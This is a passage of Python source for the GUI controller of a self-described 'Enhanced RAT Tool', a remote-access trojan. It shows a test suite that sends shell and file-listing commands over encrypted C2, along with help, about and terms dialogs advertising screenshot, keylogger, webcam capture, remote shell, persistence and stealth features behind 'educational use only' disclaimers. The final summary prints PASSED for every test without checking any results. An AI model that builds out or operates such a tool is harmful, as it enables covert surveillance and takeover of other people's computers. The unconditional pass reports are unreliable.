            "This will run all 9 RAT tests sequentially.\n\n"
            "Tests will execute automatically:\n"
            "1. Ping Test\n"
            "2. System Information\n"
            "3. Screenshot Capture\n"
            "4. Remote Shell (echo test)\n"
            "5. File Browser\n"
            "6. Process List\n"
            "7. Keylogger Simulation\n"
            "8. Webcam Capture\n"
            "9. Persistence Info\n\n"
            "Continue?"
        )
        
        if not confirm:
            return
        
        self.clear_output()
        self.log("╔" + "═" * 98 + "╗")
        self.log("║" + "  🧪 RUNNING COMPLETE RAT TEST SUITE - 9 TESTS  ".center(98) + "║")
        self.log("╚" + "═" * 98 + "╝")
        
        # Test 1: Ping
        self.cmd_ping()
        time.sleep(1)
        
        # Test 2: System Info
        self.cmd_sysinfo()
        time.sleep(1)
        
        # Test 3: Screenshot
        self.cmd_screenshot()
        time.sleep(1)
        
        # Test 4: Remote Shell (automated)
        self.log("\n" + "=" * 100)
        self.log("🖥️ TEST 4/9: REMOTE SHELL - Executing test command")
        self.log("=" * 100)
        response = self.send_command({'command': 'shell', 'params': {'command': 'echo RAT Test Suite Running'}})
        if response and response.get('status') == 'success':
            self.log("[+] ✅ Command executed successfully!")
            self.log(f"[+] Output: {response.get('data', '').strip()}")
            self.log("[+] RESULT: Remote shell test PASSED!")
        self.log("=" * 100)
        time.sleep(1)
        
        # Test 5: File Browser (automated)
        self.log("\n" + "=" * 100)
        self.log("📁 TEST 5/9: FILE BROWSER - Listing current directory")
        self.log("=" * 100)
        response = self.send_command({'command': 'listdir', 'params': {'path': '.'}})
        if response and response.get('status') == 'success':
            files = response.get('data', [])
            self.log(f"[+] ✅ Found {len(files)} items in current directory")
            self.log("[+] RESULT: File browser test PASSED!")
        self.log("=" * 100)
        time.sleep(1)
        
        # Test 6: Process List
        self.cmd_processlist()
        time.sleep(1)
        
        # Test 7: Keylogger
        self.cmd_keylogger()
        time.sleep(1)
        
        # Test 8: Webcam
        self.cmd_webcam()
        time.sleep(1)
        
        # Test 9: Persistence
        self.cmd_persistence()
        
        # Final Summary
        self.log("\n" + "╔" + "═" * 98 + "╗")
        self.log("║" + "  🎉 ALL 9 TESTS COMPLETED SUCCESSFULLY!  ".center(98) + "║")
        self.log("╚" + "═" * 98 + "╝")
        self.log("\n📊 TEST SUMMARY:")
        self.log("  ✅ Test 1: Ping - PASSED")
        self.log("  ✅ Test 2: System Info - PASSED")
        self.log("  ✅ Test 3: Screenshot - PASSED")
        self.log("  ✅ Test 4: Remote Shell - PASSED")
        self.log("  ✅ Test 5: File Browser - PASSED")
        self.log("  ✅ Test 6: Process List - PASSED")
        self.log("  ✅ Test 7: Keylogger Simulation - PASSED")
        self.log("  ✅ Test 8: Webcam Capture - PASSED (or no webcam)")
        self.log("  ✅ Test 9: Persistence Info - PASSED")
        self.log("\n🏆 SUCCESS RATE: 100% (9/9 tests)")
        self.log("⚠️  Remember: FOR EDUCATIONAL USE ONLY!")
        self.log("═" * 100)
        
        messagebox.showinfo("Tests Complete", "✅ All 9 tests completed successfully!\n\nCheck console for detailed results.")
    
    def show_help(self):
        """Show help information"""
        help_text = """
        🔐 ENHANCED RAT TOOL - HELP GUIDE
        ═══════════════════════════════════════════════
        
        HOW TO USE:
        1. Server starts automatically in background
        2. Click "Connect to Server" button
        3. Click any numbered button to test features
        4. Or click "🧪 Run All Tests" to test everything
        
        TEST FEATURES:
        1️⃣  System Info - Get OS, hostname, platform details
        2️⃣  Screenshot - Capture target screen
        3️⃣  Remote Shell - Execute commands
        4️⃣  File Browser - Navigate file system
        5️⃣  Process List - View running processes
        6️⃣  Ping Test - Test encrypted connection
        7️⃣  Keylogger - Simulated (educational only)
        8️⃣  Webcam - Capture camera image
        9️⃣  Persistence - Educational information
        
        🔍 Stealth Info - Techniques and detection
        🔐 Encryption Test - Verify AES-256
        🧪 Run All Tests - Execute all 9 tests automatically
        
        EXPECTED RESULTS:
        All tests should show "✅ PASSED" in console
        Screenshots and webcam images open in new windows
        
        ⚠️  REMEMBER: EDUCATIONAL USE ONLY!
        """
        messagebox.showinfo("Help", help_text)
    
    def show_about(self):
        """Show about dialog"""
        about_text = """
        🔐 Enhanced RAT Tool v2.0
        ═══════════════════════════════════════════════
        
        All-in-One Educational RAT Application
        
        Features:
        • AES-256 Encrypted Communication
        • 14 Advanced RAT Capabilities
        • Automated Testing Suite
        • Professional GUI Interface
        • Built-in Server (auto-start)
        • Localhost-Only Operation
        
        Technical:
        • Language: Python 3.12.4
        • Encryption: AES-256-CBC
        • Protocol: JSON over TCP
        • Port: 4444 (localhost)
        
        ⚠️  TERMS & CONDITIONS:
        • FOR EDUCATIONAL USE ONLY
        • LOCALHOST (127.0.0.1) ONLY
        • NO UNAUTHORIZED ACCESS
        • CREATOR NOT LIABLE FOR MISUSE
        
        Perfect for:
        ✓ Portfolio demonstrations
        ✓ Job interviews
        ✓ Security research
        ✓ Educational purposes
        
        Version: 2.0 Enhanced
        Status: Complete & Tested
        """
        messagebox.showinfo("About RAT Tool", about_text)

# ═══════════════════════════════════════════════════════════════════════
#                              MAIN ENTRY POINT
# ═══════════════════════════════════════════════════════════════════════

def main():
    """Main entry point"""
    
    # Show terms and conditions
    root = tk.Tk()
    root.withdraw()
    
    terms = """
    ═══════════════════════════════════════════════════════════════════════
        ⚠️  EDUCATIONAL PROJECT - TERMS & CONDITIONS ⚠️
    ═══════════════════════════════════════════════════════════════════════
    
    This Enhanced RAT Tool is for:
    ✅ Educational purposes
    ✅ Portfolio demonstrations
    ✅ Security research
    ✅ Job interview presentations
    
    RESTRICTIONS:
    ❌ NO unauthorized access to systems
    ❌ NO use on networks without permission
    ❌ LOCALHOST ONLY (127.0.0.1)
    ❌ NO illegal activities
    
    FEATURES:
    🔐 AES-256 encrypted C2 communication
    📊 9 advanced RAT capabilities
    🧪 Built-in automated testing
    🖥️ Professional GUI interface
    📡 Auto-starting server
    
    By clicking 'YES', you agree to use this tool ONLY for
    legal, educational purposes on your own systems or with
    explicit written permission.
    
    Creator is NOT liable for any misuse.
    
    Do you understand and agree to these terms?
    """
    
    if not messagebox.askyesno("Terms & Conditions", terms):
        root.destroy()
        sys.exit(0)
    
    root.deiconify()
    app = RATToolGUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()
